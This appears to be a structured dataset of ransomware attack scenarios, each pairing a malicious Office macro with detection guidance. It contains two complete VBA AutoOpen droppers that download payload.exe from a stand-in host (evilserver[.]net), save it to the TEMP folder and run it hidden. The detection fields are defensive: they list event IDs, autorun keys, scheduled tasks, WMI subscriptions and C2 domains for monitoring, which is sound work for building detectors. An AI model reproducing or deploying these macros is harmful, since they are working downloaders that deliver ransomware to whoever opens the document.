samples.scenario: Ransomware as a Service Infection via Malicious Macro in Office Document Leading to Credential Theft and Endpoint Encryption

technical_data.vba_macro_code:
Sub AutoOpen()
 Dim strUrl As String
 strUrl = "http://evilserver[.]net/payload.exe"
 Dim strPath As String
 strPath = Environ("TEMP") & "\payload.exe"
 Dim WinHttpReq As Object
 Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
 WinHttpReq.Open "GET", strUrl, False
 WinHttpReq.Send
 If WinHttpReq.Status = 200 Then
  Dim oStream As Object
  Set oStream = CreateObject("ADODB.Stream")
  oStream.Open
  oStream.Type = 1
  oStream.Write WinHttpReq.responseBody
  oStream.SaveToFile strPath, 2
  oStream.Close
  Shell strPath, vbHide
 End If
End Sub

samples.detection_method: Detect execution of Office macros with network activity downloading executables from rare external domains. Monitor creation of processes spawned by winword.exe that run payloads from TEMP directories. Detect registry autorun keys with suspicious names like 'SysUpdate' pointing to TEMP executables. Analyze network traffic for POST requests containing JSON payloads with machine IDs and credential theft indicators. Correlate event ID 4688 for new process creation with elevated privileges and suspicious parent-child relationships. Monitor file access denial events indicating encryption or file locking.

samples.scenario: Ransomware as a Service Infection via Malicious Macro-Enabled Document Leading to Endpoint Encryption and Persistence via Scheduled Task

technical_data.vba_macro_code:
Sub AutoOpen()
 Dim http As Object
 Set http = CreateObject("MSXML2.XMLHTTP")
 http.Open "GET", "http://evilserver[.]net/payload.exe", False
 http.Send
 If http.Status = 200 Then
  Dim stream As Object
  Set stream = CreateObject("ADODB.Stream")
  stream.Open
  stream.Type = 1
  stream.Write http.responseBody
  stream.SaveToFile Environ("TEMP") & "\payload.exe", 2
  stream.Close
  Shell Environ("TEMP") & "\payload.exe", vbHide
 End If
End Sub

samples.detection_method: Detect execution of macro-enabled documents spawning cmd to launch executables from TEMP directory. Monitor creation of scheduled tasks with suspicious names like 'UpdaterCheck' pointing to TEMP folder executables. Correlate process creation events involving winword.exe spawning cmd.exe and subsequent payload.exe execution. Network monitoring for HTTP GET requests to known malicious servers such as evilserver.net. Analyze event logs for task creation event ID 4698 and process creation event ID 4688 with matching suspicious command lines. Verify backup availability before infection and isolate affected hosts.

samples.detection_method: Detect execution of payload.exe from unusual locations such as C:\Windows\Temp initiated by explorer.exe. Monitor WMI event subscriptions that trigger payload execution on USB drive insertion events, indicated by filter names like UpdaterListener. Correlate event ID 4697 for service installation with suspicious names and event ID 4688 for process creation of payload.exe. Network monitoring for POST requests with JSON commands to known C2 domains such as c2dropper.attackersite.net. Analyze autorun.inf files on removable drives for malicious payload execution commands. Ensure backup systems are isolated and verify backup integrity before infection.
